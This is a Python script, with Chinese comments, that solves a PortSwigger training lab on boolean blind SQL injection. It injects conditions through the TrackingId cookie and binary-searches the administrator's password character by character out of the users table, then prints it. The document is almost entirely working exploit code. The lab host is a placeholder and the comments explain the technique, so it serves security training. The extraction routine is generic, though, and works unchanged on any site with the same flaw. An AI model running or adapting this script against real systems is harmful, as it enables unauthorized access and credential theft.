#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
布尔盲注提取密码 —— PortSwigger「Blind SQL injection with conditional responses」

思路：页面不返回数据，但"Inject 后 Welcome back 出现/消失"是一个二值信号。
     把每个字符的比较变成 true/false 问题，用二分法把每字符的请求数压到 ~7 次。

用法：
  1. 打开 lab，登录后 F12 → Application → Cookies，抄下 TrackingId 和 session
  2. 填到下面三个常量里
  3. python blind_sqli_boolean.py
"""
import sys
import time
import urllib.error
import urllib.request

# ── 改成你自己的 ────────────────────────────────────────────
BASE = "https://0a0000000000000000000000.web-security-academy.net"
TRACK_ID = "PASTE_TRACKING_ID_HERE"
SESSION = "PASTE_SESSION_HERE"
MARKER = "Welcome back"          # 「真」信号：页面上出现这句话
# ───────────────────────────────────────────────────────────

PWD_LEN = 20                     # 这道题 administrator 密码 20 位
DELAY = 0.05                     # 请求间隔，别把靶场打挂


def is_true(cond: str) -> bool:
    """把 cond 拼进 TrackingId 的 SQL 里，返回页面是否出现 MARKER。"""
    cookie = f"TrackingId={TRACK_ID}' AND {cond}--"
    if SESSION:
        cookie += f"; session={SESSION}"
    req = urllib.request.Request(
        BASE + "/",
        headers={"Cookie": cookie, "User-Agent": "blind-sqli-lab/1.0"},
    )
    try:
        body = urllib.request.urlopen(req, timeout=20).read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:          # 500 也算一种信号，读出来
        body = e.read().decode("utf-8", "ignore")
    time.sleep(DELAY)
    return MARKER in body


def extract_char(pos: int) -> str:
    """二分：找到最小的 c，使得 SUBSTRING(...) > c 不成立。"""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (
            f"(SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')"
            f" > '{chr(mid)}'"
        )
        if is_true(cond):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def main() -> int:
    if "PASTE_TRACKING_ID_HERE" in TRACK_ID:
        print("先把 BASE / TRACK_ID / SESSION 三个常量填上")
        return 2
    if not is_true("'1'='1'"):
        print("自检失败：连 '1'='1' 都没出现 MARKER —— 检查 cookie 是否抄错、lab 是否过期")
        return 1

    pwd = ""
    for i in range(1, PWD_LEN + 1):
        ch = extract_char(i)
        pwd += ch
        print(f"[{i:02d}/{PWD_LEN}] {pwd}", flush=True)

    print("\npassword =", pwd)
    print(f"请求数约 {PWD_LEN * 7} 次（线性逐个比较要 {PWD_LEN * 95} 次）")
    return 0


if __name__ == "__main__":
    sys.exit(main())
